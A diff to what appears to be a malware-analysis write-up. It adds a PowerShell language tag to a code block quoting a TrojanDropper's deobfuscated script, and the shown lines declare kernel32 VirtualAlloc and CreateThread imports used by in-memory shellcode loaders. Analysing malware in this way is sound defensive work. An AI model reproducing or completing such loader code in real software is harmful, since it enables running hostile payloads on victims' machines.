@@ -216,7 +216,7 @@ If we analyze the report, we can see that a '**TrojanDropper**' has been spotted
 
 If we fix the Powershell script format, we end having the following:
 
-```
+```powershell
 $OleSPrlmhB = @""[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 [DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 ""@
